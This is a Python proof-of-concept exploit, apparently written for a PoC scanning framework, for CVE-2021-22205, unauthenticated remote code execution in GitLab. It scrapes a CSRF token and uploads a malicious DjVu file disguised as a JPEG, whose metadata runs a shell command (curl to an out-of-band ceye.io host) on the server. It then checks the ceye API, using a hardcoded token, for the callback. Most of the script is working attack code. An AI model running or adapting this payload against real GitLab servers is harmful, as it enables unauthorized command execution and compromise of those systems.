from datetime import date
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import error, tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup

POC_NAME = "CVE_2021_22205_gitlab_unauth_rce"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class CVE_2021_22205_gitlab_unauth_rce(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0049',    # PoC的VID编号
            'vbid': '',
            'Name': 'CVE_2021_22205_gitlab_unauth_rce',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-08',    # PoC创建时间
        },

        'vul': {
            'Product': '11.9 <= GitLab（CE/EE）< 13.8.813.9 <= GitLab（CE/EE）< 13.9.613.10 <=GitLab（CE/EE）< 13.10.3',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': '未授权RCE',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                GitLab是一款Ruby开发的Git项目管理平台。如11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞CVE-2021-22204的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行命令。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-11-03',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        session = requests.Session()
        r = session.get(target.strip("/") + "/users/sign_in", verify=False)
        soup = BeautifulSoup(r.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")
        data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl lUc1f3r11.ck7zuw.ceye.io} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36", "Connection": "close", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5", "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}

        url = urljoin(target,"/uploads/user")
        #resp = req(url, 'get', headers=header, allow_redirects=False)
        resp = req(url, 'post', headers=header, data=data, allow_redirects=False)
        print("[+] send request post payload done...")

        ceye_token = "be530b0ef6618b0642ddb72079bfd1f7"
        api = 'http://api.ceye.io/v1/records?token=%s&type=dns' % ceye_token
        res = requests.get(api, verify=False ,timeout=30).json()
        if res.status_code == 200 and "lUc1f3r11" in str(res['data']):
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = resp.text
            if verbose:
                highlight("[+] url: " + url + " 存在CVE-2021-22205 gitlab unauth rce漏洞！！！")
        else:
            if verbose:
                highlight("[+] url: " + url + " 不存在CVE-2021-22205 gitlab unauth rce漏洞！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)